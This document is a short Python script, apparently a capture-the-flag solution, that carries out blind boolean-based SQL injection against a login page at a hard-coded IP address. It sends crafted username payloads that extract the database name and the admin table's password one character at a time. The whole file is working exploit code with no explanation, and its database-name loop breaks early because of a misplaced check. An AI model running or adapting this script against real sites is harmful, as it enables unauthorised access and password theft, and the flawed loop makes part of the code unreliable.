import requests
str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="
url="http://123.206.31.85:49167/index.php"
r=requests.session()

def databasere():
    resutlt=""
    for i in range(30):
        fla = 0
        for j in str_all:
            playlod="admin'^(ascii(mid(database()from({})))<>{})^0#".format(str(i),ord(j))
            data = {
                "username": playlod,
                "password": "123"
            }
            s=r.post(url,data)
            print(playlod)
            if "error" in s.text:
                resutlt+=j
                print(resutlt)
            if fla == 0:
                break

def password():
    resutlt=""
    for i in range(40):
        fla=0
        for j in str_all:
            playlod = "admin'^(ascii(mid((select(password)from(admin))from({})))<>{})^0#".format(str(i+1),ord(j))
            data = {
                "username": playlod,
                "password": "123"
            }
            s=r.post(url,data)
            print(playlod)
            if "error" in s.text:
                resutlt+=j
                fla=1
                print('**************************',resutlt)
        if fla==0:
            break
#databasere()
password()